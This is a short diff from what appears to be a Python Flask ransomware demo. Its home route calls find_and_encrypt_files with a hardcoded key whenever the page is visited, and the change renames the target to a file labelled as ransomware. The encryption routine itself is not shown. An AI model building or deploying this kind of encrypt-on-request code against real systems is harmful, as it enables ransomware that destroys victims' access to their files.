@@ -45,7 +45,7 @@ encryption_key = b'Sixteen byte key'
 @app.route('/')
 def home():
     # استدعاء التشفير عند زيارة الرابط
-    find_and_encrypt_files('test.txt', encryption_key)
+    find_and_encrypt_files('testrnsomwareppo.txt', encryption_key)
     return "Files are being encrypted!"
 
 if __name__ == "__main__":
